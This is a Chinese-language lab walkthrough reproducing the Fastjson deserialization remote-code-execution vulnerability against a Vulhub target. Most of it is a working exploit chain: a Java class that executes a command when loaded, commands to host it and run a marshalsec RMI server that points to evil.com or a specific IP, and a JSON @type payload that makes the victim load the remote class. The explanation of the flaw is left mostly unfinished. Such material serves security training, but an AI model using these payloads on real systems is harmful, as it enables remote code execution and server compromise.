# Fastjson 反序列化漏洞



代码库: 

https://github.com/alibaba

# 环境配置

> fastjson  <=1.2.47
>
> fastjson <= 1.2.24
>
> 攻击机: 一台Kali
>
> 一个能够被公众下载到文件的网站.

# 原理

1. 在**序列化**的时候, 会调用成员变量的**get方法**, **私有成员变量**不会被反序列化
2. 在**反序列化**的时候, 会调用成员变量的set 方法, **publibc** 修改的成员全部自动赋值

> 造成漏洞的主要的原因就是因为`自省, 也就是 @type`, **因为fastjson在序列化的时候如果不给一个类, 那么, 就必须使用`@type`来指定类, 否则的话,  程序无法进行正常的序列化, 这种情况叫 "类丢失"**

> ^^^^^^具体原理 ,  暂略 ^^^^^^^^^^^^^^^^

#  漏洞复现

> 靶场用的是 Vulhub

1. 打开**vulhub**给的 `fastjson 1.2.24-rce` , 打开界面如下所示:

![image-20230409212642468](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230409212642468.png)



3.  进行恶意文件的编译: 

> 创建TouchFile.java 这个文件, 文件内容如下:

   ```java
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;
   
public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};    //如果能连接上的话, 一定能访问这个我们成功success文件.
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
   ```

   

4. 上传文件

   将文件上传到 **能够被公众访问到的网站**, (不管怎么样, 我们的目的就是让别人能够访问下载这个恶意文件.) , 如果用的靶机是 本地的虚拟机, 那直接开启 文件上传就行.

```
python -m http.server 8089
```

![image-20230409221108981](https://raw.githubusercontent.com/QDGSCLOUD/BJYH_picture/main/img/image-20230409221108981.png)

**注意: 此处用的是python3开启的服务,  python2开启http服务和python3不一样, 请自行搜索.**



```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999
```







5. 用 marshalsec 开启 `RMI服务` , 监听 9999端口, 并且加载远程类` TouchFile.`class

```shell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://49.233.58.224:1662/#TouchFile" 9999
```



6. 发送payload

   ```Post
   {
       "a":{
           "@type":"java.lang.Class",
           "val":"com.sun.rowset.JdbcRowSetImpl"
       },
       "b":{
           "@type":"com.sun.rowset.JdbcRowSetImpl",
           "dataSourceName":"rmi://evil.com:9999/Exploit",
           "autoCommit":true
       }
   }
   ```








